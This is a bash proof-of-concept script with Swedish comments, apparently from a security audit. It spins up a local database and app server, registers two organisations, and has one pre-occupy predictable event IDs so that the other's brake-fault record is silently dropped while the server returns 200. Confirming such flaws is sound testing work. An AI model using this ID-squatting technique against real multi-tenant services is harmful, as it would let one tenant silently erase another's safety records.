#!/usr/bin/env bash
# TÜV-prov: kan en organisation hindra en annan från att skriva historik?
#
# Händelse-id sätts av klienten och är Date.now().toString(36) + räknare
# (app/src/felsokning/domain.ts:251) — alltså förutsägbart. Primärnyckeln
# i felsokning_handelser är GLOBAL, och insert sker med
# `on conflict (id) do nothing`.
#
# Frågan: kan org B ockupera ett id som org A senare kommer att använda,
# så att org A:s händelse tyst försvinner?
set -euo pipefail
cd "$(dirname "$0")"

PGPORT=5497
APPPORT=8397
BAS="http://127.0.0.1:$APPPORT"
DATADIR=$(mktemp -d)
PGBIN=$(ls -d /usr/lib/postgresql/*/bin | head -1)
KOD=/home/user/konditori-joy/felsokning

stada() {
  kill "$SERVER_PID" 2>/dev/null || true
  su postgres -c "$PGBIN/pg_ctl -D '$DATADIR' stop -m immediate" >/dev/null 2>&1 || true
  rm -rf "$DATADIR"
}
trap stada EXIT

chown postgres "$DATADIR"
su postgres -c "$PGBIN/initdb -D '$DATADIR' -A trust" >/dev/null
su postgres -c "$PGBIN/pg_ctl -D '$DATADIR' -o '-p $PGPORT -k /tmp -c listen_addresses=127.0.0.1' -l '$DATADIR/logg' start" >/dev/null
su postgres -c "$PGBIN/psql -h /tmp -p $PGPORT -d postgres -qc \"create role plattform login password 'test'\""
su postgres -c "$PGBIN/psql -h /tmp -p $PGPORT -d postgres -qc 'create database felsokning owner plattform'"
PGPASSWORD=test "$PGBIN/psql" -h 127.0.0.1 -p $PGPORT -U plattform -d felsokning -q -f "$KOD/infra/postgres-init.sql"

DATABASE_URL="postgresql://plattform:test@127.0.0.1:$PGPORT/felsokning" \
  JWT_SECRET=tuvhemlighet PORT=$APPPORT node "$KOD/services/plattform/server.mjs" >/dev/null 2>&1 &
SERVER_PID=$!
sleep 1

falt() { node -pe "JSON.parse(require('fs').readFileSync(0,'utf8'))$1"; }

TOKEN_A=$(curl -s -X POST "$BAS/api/auth/registrera" -H 'Content-Type: application/json' \
  -d '{"epost":"a@a.se","losenord":"hemligt123","namn":"Anna","organisation":"Verkstad A"}' | falt .token)
TOKEN_B=$(curl -s -X POST "$BAS/api/auth/registrera" -H 'Content-Type: application/json' \
  -d '{"epost":"b@b.se","losenord":"hemligt123","namn":"Bo","organisation":"Verkstad B"}' | falt .token)

curl -s -X POST "$BAS/api/arenden" -H "Authorization: Bearer $TOKEN_A" -H 'Content-Type: application/json' \
  -d '{"id":"arende-a","nummer":1,"skapad":"2026-08-06T08:00:00Z"}' >/dev/null
curl -s -X POST "$BAS/api/arenden" -H "Authorization: Bearer $TOKEN_B" -H 'Content-Type: application/json' \
  -d '{"id":"arende-b","nummer":1,"skapad":"2026-08-06T08:00:00Z"}' >/dev/null

# Så här ser ett riktigt klient-id ut. Angriparen behöver inte gissa —
# formatet står i källkoden och tiden är allmänt känd.
IDN=$(node -pe "
  const t = Date.now() + 60000;           // en minut fram i tiden
  Array.from({length: 40}, (_, i) => t.toString(36) + '-' + i.toString(36)).join(' ')
")
FORSTA=$(echo "$IDN" | cut -d' ' -f1)

# Org B ockuperar id:na på SITT EGET ärende. Inget anrop rör org A.
POSTER=$(node -pe "
  JSON.stringify({ handelser: '$IDN'.split(' ').map((id) => ({
    id, tidpunkt: '2026-08-06T08:01:00Z', anvandare: 'Bo',
    handelse: { typ: 'observation', text: 'Ockuperad.' } })) })
")
curl -s -X POST "$BAS/api/arenden/arende-b/handelser" -H "Authorization: Bearer $TOKEN_B" \
  -H 'Content-Type: application/json' -d "$POSTER" >/dev/null

# Org A dokumenterar ett verkligt fynd och råkar få samma id.
SVAR=$(curl -s -w '\n%{http_code}' -X POST "$BAS/api/arenden/arende-a/handelser" \
  -H "Authorization: Bearer $TOKEN_A" -H 'Content-Type: application/json' \
  -d "{\"handelser\":[{\"id\":\"$FORSTA\",\"tidpunkt\":\"2026-08-06T08:02:00Z\",\"anvandare\":\"Anna\",
       \"handelse\":{\"typ\":\"felorsak\",\"avvikelse\":\"Bromsledning skavd mot chassi.\",
       \"orsaker\":[\"Montagefel\"],\"underlag\":[\"Foto\"],\"sakerhet\":\"hog\",
       \"atgard\":\"Byt ledning och sätt ny klammer.\"}}]}")
STATUS=$(echo "$SVAR" | tail -1)

echo
echo "org A fick statuskod:            $STATUS"
ANTAL=$(curl -s "$BAS/api/arenden/arende-a/handelser" -H "Authorization: Bearer $TOKEN_A" | falt .handelser.length)
echo "händelser i org A:s ärende:      $ANTAL"
AGARE=$(PGPASSWORD=test "$PGBIN/psql" -h 127.0.0.1 -p $PGPORT -U plattform -d felsokning \
  -tAc "select arende_id from felsokning_handelser where id='$FORSTA'")
echo "id '$FORSTA' tillhör: $AGARE"
echo
if [ "$STATUS" = "200" ] && [ "$ANTAL" = "0" ]; then
  echo "BEKRÄFTAT: org A:s felorsak försvann. Servern svarade 200."
else
  echo "Ej reproducerat."
fi
